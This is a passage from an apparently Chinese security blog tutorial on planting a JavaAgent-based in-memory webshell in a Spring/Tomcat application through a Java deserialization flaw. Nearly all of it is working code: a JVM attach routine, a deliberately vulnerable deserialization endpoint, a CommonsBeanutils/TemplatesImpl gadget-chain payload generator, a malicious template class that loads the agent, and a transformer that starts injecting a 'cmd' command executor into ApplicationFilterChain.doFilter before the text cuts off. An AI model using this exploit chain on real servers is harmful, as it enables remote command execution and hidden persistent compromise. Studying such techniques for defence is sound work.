class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attach</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            System.out.println(toolsPath.toURI().toURL());</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List&lt;Object&gt; list = (java.util.List&lt;Object&gt;) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                System.out.println(name);</span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;org.example.HelloWorld&quot;</span>))&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/home/rainb0w/codes/java_projects/agent/out/artifacts/agent_jar/agent.jar&quot;</span>;</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tools.jar 不会在 JVM 启动的时候默认加载，这里通过URLClassLoader加载tools.jar。attach到org.example.HelloWorld，加载agent.jar更改Hello类的Hello方法，将<code>System.out.println(\&quot;Attach Successful!\&quot;);</code>插入到了Hello方法前面。</p><p>执行HelloWorld的main方法，输出了一次Hello World：</p><p><img src="https://pic.imgdb.cn/item/64d270101ddac507cc0ab183.jpg" alt="image-20230804122327322"></p><p>执行Attach的main方法后，随意输入一个数，可以看到Hello类的Hello方法已经被改变：</p><p><img src="https://pic.imgdb.cn/item/64d2701c1ddac507cc0ad763.jpg" alt="image-20230804123610992"></p><p>了解JavaAgent后，我们可以来打内存马了。还记得我们在Filter内存马那里的流程分析吗？在经过org.apache.catalina.core.ApplicationFilterFactory#createFilterChain后我们得到了一个ApplicationFilterChain对象，之后又调用了这个ApplicationFilterChain对象的doFilter函数，其中有request对象参数和response对象参数。因此我们可以更改ApplicationFilterChain类的doFilter函数，向它的前面添加一些恶意代码。</p><h4 id="反序列化注入-JavaAgent-型内存马"><a href="#反序列化注入-JavaAgent-型内存马" class="headerlink" title="反序列化注入 JavaAgent 型内存马"></a>反序列化注入 JavaAgent 型内存马</h4><p>首先创建一个简单的SpringBoot项目，并导入common-beanutils依赖，以下是一个示例controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo.controllers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializeController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/deserialize&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Vuln</span><span class="params">(<span class="meta">@RequestParam(required = false, name = &quot;bytecodes&quot;)</span> String encodedBytecodes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        System.out.println(encodedBytecodes);</span></span><br><span class="line">        <span class="keyword">if</span>(encodedBytecodes == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(encodedBytecodes);</span><br><span class="line">            <span class="type">byte</span>[] bytecodes = Base64.getDecoder().decode(encodedBytecodes);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytecodes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后给出生成payload的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(AgentTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意模板类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            System.out.println(toolsPath.toURI().toURL());</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List&lt;Object&gt; list = (java.util.List&lt;Object&gt;) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                System.out.println(name);</span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;com.example.vul_demo.VulDemoApplication&quot;</span>))&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/home/rainb0w/codes/java_projects/agent/out/artifacts/agent_jar/agent.jar&quot;</span>;</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将以下项目打成jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TestTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    inst.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClassFileTransformer的实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span 